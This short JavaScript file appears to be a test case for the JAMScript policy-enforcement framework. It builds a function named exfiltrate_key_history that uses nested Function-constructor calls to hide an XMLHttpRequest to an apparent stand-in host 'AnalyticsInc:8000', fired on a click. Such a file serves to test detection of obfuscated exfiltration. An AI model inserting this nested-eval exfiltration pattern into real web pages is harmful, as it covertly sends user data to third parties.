
JAM.startProfile('load');
function exfiltrate_key_history(){var nest='return Function(\'xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest4", true);xmlhttp.send(null);\');',nest=JAMScript.call(Function,null,[nest]),nest=JAMScript.call(nest,null,[]),v1=xmlhttp=new XMLHttpRequest;JAMScript.call(nest,null,[v1])}var v2=document.getElementById("test");JAMScript.set(v2,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
